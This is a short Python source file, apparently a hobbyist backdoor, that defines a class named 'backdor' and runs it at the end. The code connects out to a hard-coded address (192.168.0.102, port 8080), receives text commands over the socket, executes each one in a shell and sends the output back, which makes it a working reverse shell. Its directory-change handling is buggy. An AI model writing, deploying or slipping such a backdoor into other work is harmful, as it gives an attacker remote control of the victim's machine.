import socket
import subprocess
import sys
import os
import json

class backdor:
    '''define a class'''

    def __init__(self, ip, ports):
        self.connected = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected.connect((ip, ports))
        # connected.send("[+] Connection establisted.\n".encode())
    
    def use_for_system_command(self, commnd):
        '''define a function'''
        return subprocess.check_output(commnd, shell=True)

    def command_send(self):
        '''define a function in this function send data in server client'''
        self.connected.send(self.data)

    def command_receive(self):
        '''receive command use this function'''
        md = self.connected.recv(1024)
        self.command = md.decode()
        self.data = self.use_for_system_command(self.command)
        

    def brack(self):
        '''this function use to program exit'''
        if self.command=='exit':
            self.connected.close()
            sys.exit()

    def change_dir(self, pta):
        '''This Function is used to change the current directory'''
        get_pt = os.getcwd()
        str_pt = pta
        create_pat = os.path.join(get_pt, str_pt)
        os.chdir(create_pat)
        return os.getcwd()
        


    def run(self):
        '''all function call in this run function'''
        while True:
            command = self.command_receive()
            self.brack()
            self.command_send()
            if self.command.startswith("cd "):
                self.command_result = self.change_dir(command)



dor = backdor("192.168.0.102", 8080)
dor.run()


